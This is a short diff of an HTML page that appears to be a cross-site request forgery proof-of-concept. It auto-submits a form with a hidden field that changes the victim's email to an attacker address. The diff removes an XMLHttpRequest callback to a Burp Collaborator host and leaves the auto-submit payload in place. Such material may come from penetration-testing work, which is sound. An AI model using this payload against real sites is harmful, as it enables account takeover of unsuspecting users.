@@ -4,17 +4,6 @@
       <input type="hidden" name="email" value="pwned@evil-user.net" />
     </form>
     <script>
-      var request = new XMLHttpRequest();
-      request.onreadystatechange = function() {
-          if (this.readyState == 4 && (this.status == 200 || this.status == 302)) {
-              console.log("ok")
-          }else if(this.readyState == 4){
-              console.log('Error status code:'+this.status)
-          }
-      };
-      var postUrl='http://gl5kbyebrgp6gdr63yf8yr0cb3ht5i.burpcollaborator.net'
-      request.open("get", postUrl);
-      request.send()
       document.forms[0].submit();
     </script>
   </body>
